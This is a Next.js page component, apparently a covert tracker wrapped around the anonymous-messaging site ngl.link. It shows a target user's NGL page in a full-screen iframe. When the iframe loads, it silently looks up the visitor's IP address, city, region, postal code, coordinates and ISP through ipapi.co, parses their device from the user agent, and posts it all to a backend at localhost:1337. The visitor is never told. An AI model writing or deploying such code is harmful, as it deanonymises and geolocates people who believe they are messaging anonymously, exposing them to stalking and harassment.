import type { NextPage } from 'next'
import { SyntheticEvent } from 'react'

import DeviceDetector from 'device-detector-js'
import { useRouter } from 'next/router'

async function fetchData() {
  const response = await fetch('https://ipapi.co/json/')
  const result = response.json()

  return result
}

async function uploadData(body: object) {
  fetch('http://localhost:1337/api/ips', {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ data: body })
  })
  .then(response => response.json())
  .then(data => console.log(data))
}

const Home: NextPage = () => {
  const router = useRouter()
  const { username } = router.query
  
  async function onload(e: SyntheticEvent<HTMLIFrameElement, Event>) {
    const detector = new DeviceDetector()
    const agent = navigator.userAgent
    const device = detector.parse(agent)

    const data = await fetchData()
    const map = {
      my_username: username,
      ip: data.ip,
      city: data.city,
      country: data.country,
      region: data.region,
      postal: data.postal,
      latitude: data.latitude,
      longitude: data.longitude,
      version: data.version,
      org: data.org,
      ...device
    }

    await uploadData(map)
  }

  return (
    <div
      style={{ width: '100%', height: '100vh', padding: 0, margin: 0 }}
    >
      <iframe
        src={'https://ngl.link/' + username}
        style={{ width: '100%', height: '100vh', border: 0 }}
        onLoad={onload}
      ></iframe>
    </div>
  )
}

export default Home
